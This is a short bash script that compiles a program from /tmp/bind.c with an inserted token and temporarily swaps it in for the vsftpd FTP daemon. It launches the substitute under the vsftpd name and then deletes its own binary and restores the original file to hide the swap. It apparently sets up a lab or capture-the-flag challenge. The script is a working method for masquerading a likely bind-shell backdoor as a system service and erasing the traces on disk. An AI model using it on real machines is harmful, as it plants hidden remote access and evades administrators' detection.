#!/bin/bash
#vsftp script
T1=$(python3 /tmp/gen_token1.py)
sed -i "s/PLACEHOLDER/$T1/" /tmp/bind.c
unset T1
unset TOKEN{1,2,3,4,5,6,7,8,9}
gcc -o /usr/sbin/vsftp /tmp/bind.c
chmod +x /usr/sbin/vsftp
mv /usr/sbin/vsftpd /usr/sbin/vsftpd.bak
ln -s /usr/sbin/vsftp /usr/sbin/vsftpd
pkill vsftpd
/usr/sbin/vsftpd &
rm /usr/sbin/vsftp
rm /usr/sbin/vsftpd
mv /usr/sbin/vsftpd.bak /usr/sbin/vsftpd
